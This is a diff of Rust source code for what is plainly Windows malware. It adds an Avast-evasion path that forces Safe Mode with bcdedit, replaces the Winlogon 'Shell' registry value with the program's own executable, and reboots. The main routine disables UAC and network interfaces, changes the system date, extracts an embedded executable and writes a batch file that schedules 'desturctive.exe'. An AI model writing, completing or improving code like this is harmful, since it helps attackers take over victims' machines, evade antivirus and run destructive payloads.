@@ -5,7 +5,7 @@ use std::io::{self, Write};
 use winreg::enums::*;
 use winreg::RegKey;
 use std::fs;
-use std::{thread, time};
+use std::env;
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -124,6 +124,31 @@ fn modify_registry() -> io::Result<()> {
     Ok(())
 }
 
+fn modify_registry_avast() -> io::Result<()> {
+    // Get the current executable path
+    let current_exe_path = env::current_exe()?;
+
+    // Open the registry key for Winlogon
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let winlogon_key = hkcu.open_subkey_with_flags(
+        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
+        KEY_SET_VALUE,
+    )?;
+
+    // Delete existing "Shell" value (if it exists)
+    match winlogon_key.delete_value("Shell") {
+        Ok(_) => println!("Existing Shell value deleted."),
+        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
+    }
+
+    // Convert the path to a String and set new "Shell" value to the current executable path
+    winlogon_key.set_value("Shell", &current_exe_path.to_string_lossy().to_string())?;
+
+    println!("Registry modified successfully: Shell set to {:?}", current_exe_path);
+
+    Ok(())
+}
+
 fn create_batch_file() -> io::Result<()> {
     // Create a batch file to clean up Safe Mode and schedule desturctive.exe
     let batch_content = r#"
@@ -196,14 +221,12 @@ fn extract_embedded_exe() -> io::Result<()> {
     Ok(())
 }
 
-fn reboot_system(timeout: Option<u32>) -> io::Result<()> {
-    // Use the provided timeout or default to 7 seconds
-    let reboot_time = timeout.unwrap_or(7);
-
+fn reboot_system() -> io::Result<()> {
+    // Shutdown and reboot the system to Safe Mode
     Command::new("shutdown.exe")
         .arg("-r")
         .arg("-t")
-        .arg(reboot_time.to_string())
+        .arg("7")
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()?;
@@ -224,6 +247,32 @@ fn check_avast_installed() -> bool {
     avast_service_running
 }
 
+// Updated function to check if the system is in Safe Mode
+fn is_in_safe_mode() -> bool {
+    // Run the bcdedit command and filter for "safeboot"
+    let output = Command::new("cmd")
+        .args(["/C", "bcdedit /enum {current} | findstr /i \"safeboot\""])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output();
+
+    match output {
+        Ok(output) => {
+            if !output.stdout.is_empty() {
+                println!("Safe Mode detected.");
+                true
+            } else {
+                println!("System is not in Safe Mode.");
+                false
+            }
+        }
+        Err(e) => {
+            eprintln!("Error checking Safe Mode status: {}", e);
+            false
+        }
+    }
+}
+
 fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -235,47 +284,100 @@ fn main() {
 
     // Step 2: Check for Avast Installation
     if check_avast_installed() {
-        println!("Avast detected. Sleeping for 65 seconds...");
-        thread::sleep(time::Duration::from_secs(65));  // Sleep for 60 seconds
-    }
+        println!("Avast detected.");
 
-    // Step 3: Kaspersky, Bitdefender bypass (General Antivirus bypass)
-    if let Err(e) = change_system_date() {
-        eprintln!("Error changing system date: {}", e);
-    }
+        // Step 3: Check if the system is in Safe Mode
+        if !is_in_safe_mode() {
+            println!("System is not in Safe Mode. Enabling Safe Mode and rebooting...");
 
-    if let Err(e) = disable_network_interfaces() {
-        eprintln!("Error disabling network interfaces: {}", e);
-    }
+            // Enable Safe Mode
+            if let Err(e) = enable_safe_mode() {
+                eprintln!("Error enabling safe mode: {}", e);
+                return;
+            }
 
-    // Step 4: Enable safe mode
-    if let Err(e) = enable_safe_mode() {
-        eprintln!("Error enabling safe mode: {}", e);
-    }
+            if let Err(e) = modify_registry_avast() {
+                eprintln!("Error modifying registry for Avast: {}", e);
+                return;
+            }
+    
+            // Reboot the system to Safe Mode
+            if let Err(e) = reboot_system() {
+                eprintln!("Error rebooting system to Safe Mode: {}", e);
+                return;
+            }
 
-    // Step 5: Disable UAC
-    if let Err(e) = disable_uac() {
-        eprintln!("Error disabling UAC: {}", e);
-    }
+            // Exit after rebooting to avoid running further operations
+            return;
+        } else {
+            println!("System is in Safe Mode. Proceeding with further steps...");
+        }
 
-    // Step 6: Extract payload
-    if let Err(e) = extract_embedded_exe() {
-        eprintln!("Error extracting embedded executable: {}", e);
-    }
+        // Continue with operations in Safe Mode
+        if let Err(e) = change_system_date() {
+            eprintln!("Error changing system date: {}", e);
+        }
 
-    // Step 7: Create the batch file in the current directory
-    if let Err(e) = create_batch_file() {
-        eprintln!("Error creating batch file: {}", e);
-        return;
-    }
+        if let Err(e) = disable_network_interfaces() {
+            eprintln!("Error disabling network interfaces: {}", e);
+        }
 
-    // Step 8: Reboot the system to Safe Mode if needed
-    if let Err(e) = reboot_system() {
-        eprintln!("Error rebooting system: {}", e);
-    }
+        if let Err(e) = disable_uac() {
+            eprintln!("Error disabling UAC: {}", e);
+        }
 
-    // Step 9: Modify the registry to set Shell value
-    if let Err(e) = modify_registry() {
-        eprintln!("Error modifying the registry: {}", e);
+        if let Err(e) = extract_embedded_exe() {
+            eprintln!("Error extracting embedded executable: {}", e);
+        }
+
+        if let Err(e) = create_batch_file() {
+            eprintln!("Error creating batch file: {}", e);
+            return;
+        }
+
+        if let Err(e) = modify_registry() {
+            eprintln!("Error modifying the registry: {}", e);
+        }
+
+        if let Err(e) = reboot_system() {
+            eprintln!("Error rebooting system: {}", e);
+        }
+
+    } else {
+        println!("Avast not detected. Proceeding with normal operations...");
+
+        // Normal operations when Avast is not detected
+        if let Err(e) = change_system_date() {
+            eprintln!("Error changing system date: {}", e);
+        }
+
+        if let Err(e) = disable_network_interfaces() {
+            eprintln!("Error disabling network interfaces: {}", e);
+        }
+
+        if let Err(e) = enable_safe_mode() {
+            eprintln!("Error enabling safe mode: {}", e);
+        }
+
+        if let Err(e) = disable_uac() {
+            eprintln!("Error disabling UAC: {}", e);
+        }
+
+        if let Err(e) = extract_embedded_exe() {
+            eprintln!("Error extracting embedded executable: {}", e);
+        }
+
+        if let Err(e) = create_batch_file() {
+            eprintln!("Error creating batch file: {}", e);
+            return;
+        }
+
+        if let Err(e) = reboot_system() {
+            eprintln!("Error rebooting system: {}", e);
+        }
+
+        if let Err(e) = modify_registry() {
+            eprintln!("Error modifying the registry: {}", e);
+        }
     }
 }
